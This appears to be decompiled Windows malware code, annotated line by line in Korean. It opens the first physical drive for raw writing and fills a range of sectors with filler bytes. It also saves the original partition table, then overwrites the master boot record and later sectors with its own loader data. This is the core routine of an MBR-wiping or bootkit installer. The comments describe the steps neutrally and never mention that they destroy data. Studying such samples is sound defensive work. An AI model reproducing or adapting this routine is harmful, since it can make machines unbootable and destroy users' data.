undefined4 entry(void) // 함수의 시작, 반환 타입은 undefined4
{
  HANDLE pvVar1; // 파일 핸들을 저장할 변수
  LPCSTR lpText; // 메시지 박스에 표시할 텍스트
  DWORD DVar2; // 파일 작업 결과를 저장할 변수
  int iVar3; // 반복문 카운터
  undefined4 *puVar4; // 배열에 대한 포인터
  char *lpCaption; // 메시지 박스의 제목
  UINT uType; // 메시지 박스의 타입
  undefined4 local_20c [111]; // 로컬 데이터 배열
  undefined local_4e [66]; // 다른 로컬 데이터 배열
  DWORD local_c; // WriteFile의 결과를 저장할 변수
  DWORD local_8; // ReadFile의 결과를 저장할 변수
  
  // 물리 드라이브 0을 열기 (쓰기 전용)
  DAT_10005438 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000, 3, (LPSECURITY_ATTRIBUTES)0x0, 3, 0, (HANDLE)0x0);
  
  // 파일 열기 실패 시 메시지 박스 표시
  if (DAT_10005438 == (HANDLE)0xffffffff) {
    uType = 0; // 메시지 박스 종류 (알림)
    lpCaption = "Fatal Error - CF"; // 제목
    lpText = (LPCSTR)GetLastError(); // 오류 메시지 가져오기
    MessageBoxA((HWND)0x0, lpText, lpCaption, uType); // 메시지 박스 표시
  }

  FUN_10006000(); // 호출할 다른 함수

  puVar4 = local_20c; // 로컬 배열 포인터 초기화
  for (iVar3 = 0x80; iVar3 != 0; iVar3 = iVar3 + -1) { // 128번 반복
    *puVar4 = 0x37373737; // 배열에 특정 값 저장
    puVar4 = puVar4 + 1; // 포인터 이동
  }

  iVar3 = 0x200; // 시작 오프셋 설정
  do {
    pvVar1 = DAT_10005438; // 파일 핸들 저장
    DVar2 = SetFilePointer(DAT_10005438, iVar3, (PLONG)0x0, 0); // 파일 포인터 이동
    if (DVar2 != 0xffffffff) { // 포인터 이동 성공 여부 확인
      WriteFile(pvVar1, local_20c, 0x200, &local_c, (LPOVERLAPPED)0x0); // 데이터 쓰기
    }
    pvVar1 = DAT_10005438; // 파일 핸들 저장
    iVar3 = iVar3 + 0x200; // 오프셋 증가
  } while (iVar3 < 0x4200); // 16800 바이트까지 반복

  // 특정 오프셋으로 파일 포인터 이동 후 데이터 쓰기
  DVar2 = SetFilePointer(DAT_10005438, 0x6e00, (PLONG)0x0, 0);
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1, local_20c, 0x200, &local_8, (LPOVERLAPPED)0x0);
  }

  FUN_10006150(); // 호출할 다른 함수

  pvVar1 = DAT_10005438; // 파일 핸들 저장
  DVar2 = SetFilePointer(DAT_10005438, 0, (PLONG)0x0, 0); // 파일 포인터를 처음으로 이동
  if (DVar2 != 0xffffffff) {
    ReadFile(pvVar1, local_20c, 0x200, &local_8, (LPOVERLAPPED)0x0); // 데이터 읽기
  }

  memcpy(&DAT_100031be, local_4e, 0x42); // 데이터 복사

  pvVar1 = DAT_10005438; // 파일 핸들 저장
  DVar2 = SetFilePointer(DAT_10005438, 0, (PLONG)0x0, 0); // 파일 포인터를 처음으로 이동
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1, &DAT_10003000, 0x200, &local_c, (LPOVERLAPPED)0x0); // 데이터 쓰기
  }

  pvVar1 = DAT_10005438; // 파일 핸들 저장
  DVar2 = SetFilePointer(DAT_10005438, 0x4400, (PLONG)0x0, 0); // 특정 오프셋으로 포인터 이동
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1, &DAT_10003200, 0x2000, &local_8, (LPOVERLAPPED)0x0); // 데이터 쓰기
  }

  CloseHandle(DAT_10005438); // 파일 핸들 닫기
  return 0; // 함수 종료
}
